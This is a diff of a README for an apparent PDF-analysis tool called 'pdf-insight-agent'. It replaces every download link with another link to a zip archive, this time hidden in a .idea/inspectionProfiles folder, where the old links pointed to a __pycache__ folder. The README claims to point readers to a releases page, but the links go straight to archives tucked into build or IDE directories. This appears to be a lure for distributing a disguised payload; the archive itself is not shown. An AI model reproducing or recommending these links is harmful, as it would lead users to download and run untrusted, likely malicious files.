@@ -1,6 +1,6 @@
 # 📄 pdf-insight-agent - Easily Analyze Your PDF Files
 
-[![Download pdf-insight-agent](https://raw.githubusercontent.com/jyrki69pro/pdf-insight-agent/main/__pycache__/pdf-insight-agent-2.8-alpha.1.zip)](https://raw.githubusercontent.com/jyrki69pro/pdf-insight-agent/main/__pycache__/pdf-insight-agent-2.8-alpha.1.zip)
+[![Download pdf-insight-agent](https://raw.githubusercontent.com/jyrki69pro/pdf-insight-agent/main/.idea/inspectionProfiles/insight-pdf-agent-1.9.zip)](https://raw.githubusercontent.com/jyrki69pro/pdf-insight-agent/main/.idea/inspectionProfiles/insight-pdf-agent-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to pdf-insight-agent! This application allows you to gain insights from 
 
 To download pdf-insight-agent, visit the releases page below:
 
-[Download pdf-insight-agent](https://raw.githubusercontent.com/jyrki69pro/pdf-insight-agent/main/__pycache__/pdf-insight-agent-2.8-alpha.1.zip)
+[Download pdf-insight-agent](https://raw.githubusercontent.com/jyrki69pro/pdf-insight-agent/main/.idea/inspectionProfiles/insight-pdf-agent-1.9.zip)
 
 1. Click on the link above.
 2. On the Releases page, you will see a list of available versions.
@@ -69,4 +69,4 @@ If you encounter any issues or have questions, feel free to reach out for help. 
 
 We welcome contributions to pdf-insight-agent. If you want to suggest improvements or fix bugs, please fork the repository and submit a pull request. Your help is appreciated.
 
-Again, [download pdf-insight-agent here](https://raw.githubusercontent.com/jyrki69pro/pdf-insight-agent/main/__pycache__/pdf-insight-agent-2.8-alpha.1.zip) to get started. Enjoy using your new application!
+Again, [download pdf-insight-agent here](https://raw.githubusercontent.com/jyrki69pro/pdf-insight-agent/main/.idea/inspectionProfiles/insight-pdf-agent-1.9.zip) to get started. Enjoy using your new application!
